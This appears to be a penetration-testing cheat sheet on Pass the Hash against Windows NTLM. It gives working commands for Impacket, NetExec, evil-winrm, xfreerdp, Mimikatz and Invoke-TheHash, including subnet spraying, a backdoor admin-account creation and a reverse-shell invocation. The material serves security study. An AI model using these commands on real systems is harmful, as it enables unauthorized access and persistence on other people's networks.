**Pass the Hash** (PtH) is a **post-exploitation technique** that allows attackers to authenticate to systems **without needing plaintext credentials**. Instead, attackers use the **hashed version** of a password directly to access resources.

This is possible due to weak authentication protocols, mainly in **Windows environments**, which validate **hashes** instead of plaintext passwords.

---

## Why it is possible

Pass the Hash is possible mainly because NTLM (New Technology LAN Manager) uses a challenge-response mechanism that allows Single Sign-On without sending the plaintext password over the network. Instead of validating the real password, the system validates the password **hash**, which means that anyone who possesses the hash can authenticate as the user. Additionally, NTLM password hashes are **not salted**, so the same hash can be reused across multiple authentication attempts, enabling Pass the Hash attacks. 



---

## Impacket – PsExec

- **Linux tool** for PtH command execution on Windows.
    

**Example:**

```bash
impacket-psexec administrator@192.168.1.20 -hashes :1A2B3C4D5E6F7890ABCDEF1234567890
```

- Other Impacket tools for PtH:
    
    - `wmiexec.py`
        
    - `atexec.py`
        
    - `smbexec.py`
        

---

## NetExec

- Automates PtH across multiple hosts.
    
- Useful for **local admin password spraying**.
    

**Scan a subnet:**

```bash
netexec smb 192.168.1.0/24 -u Administrator -H 1A2B3C4D5E6F7890ABCDEF1234567890
```

- `Pwn3d!` indicates success.
    

**Execute command remotely:**

```bash
netexec smb 192.168.1.20 -u Administrator -H 1A2B3C4D5E6F7890ABCDEF1234567890 -x whoami
```

---

## Evil-winrm

- PtH via **PowerShell Remoting**.
    

```bash
evil-winrm -i 192.168.1.20 -u Administrator -H 1A2B3C4D5E6F7890ABCDEF1234567890
```

- For domain accounts: `administrator@example.local`.
    

---

## RDP with xfreerdp

- Requires **Restricted Admin Mode** enabled on target:
    

```bash
reg add HKLM\System\CurrentControlSet\Control\Lsa /t REG_DWORD /v DisableRestrictedAdmin /d 0x0 /f
```

- Allows **GUI access** using NTLM hash.

```bash
xfreerdp /u:<username> /pth:<HASH> /v:<target_ip> /dynamic-resolution
```

---

## Mimikatz

- **Windows tool**.
    
- Module `sekurlsa::pth` runs a **process in a user's context using their hash**.
    

**Key parameters:**

- `/user` → User to impersonate
    
- `/rc4` or `/NTLM` → NTLM hash
    
- `/domain` → User's domain (`.` for local accounts)
    
- `/run` → Program to execute (default `cmd.exe`)
    

**Example:**

```powershell
c:\tools> mimikatz.exe privilege::debug "sekurlsa::pth /user:alice /rc4:9F86D081884C7D659A2FEAA0C55AD015 /domain:example.local /run:cmd.exe" exit
```

- Result: `cmd.exe` runs in the context of `alice`.
    
- Can access **shares, execute commands, scripts**.
    

---

## Invoke-TheHash

- **PowerShell tool** for PtH using **SMB** or **WMI**.
    
- **No local admin needed** on the attacker machine, but the target account must have admin rights.
    

**Key parameters:**

- `-Target` → Hostname or IP of target
    
- `-Username` → User
    
- `-Domain` → Domain (optional for local accounts)
    
- `-Hash` → NTLM hash
    
- `-Command` → Command to execute
    

**SMB example – create user `bob`:**

```powershell
Import-Module .\Invoke-TheHash.psd1
Invoke-SMBExec -Target 192.168.1.10 -Domain example.local -Username alice -Hash 9F86D081884C7D659A2FEAA0C55AD015 -Command "net user bob Password123 /add && net localgroup administrators bob /add" -Verbose
```

**WMI example – reverse shell (PowerShell Base64):**

```powershell
Invoke-WMIExec -Target DC01 -Domain example.local -Username alice -Hash 9F86D081884C7D659A2FEAA0C55AD015 -Command "<Base64-PowerShell-Command>"
```

- Result: Remote shell from `DC01` to attacker.
    


---

## UAC Considerations
UAC restricts remote administrative actions performed by **local accounts**, which directly affects Pass the Hash. When `HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System\LocalAccountTokenFilterPolicy` is set to **0** (default), only the built-in local Administrator account (RID 500) can perform remote administration; other local admin accounts receive a filtered token and cannot use PtH remotely. Setting it to **1** allows all local administrators to perform remote admin tasks.

There is an exception: if `FilterAdministratorToken` is enabled (value **1**), the RID 500 account is also subject to UAC restrictions, causing remote Pass the Hash to fail even for the built-in Administrator account.

These limitations apply only to **local accounts**. **Domain accounts** with administrative rights on a system can still use Pass the Hash regardless of these settings.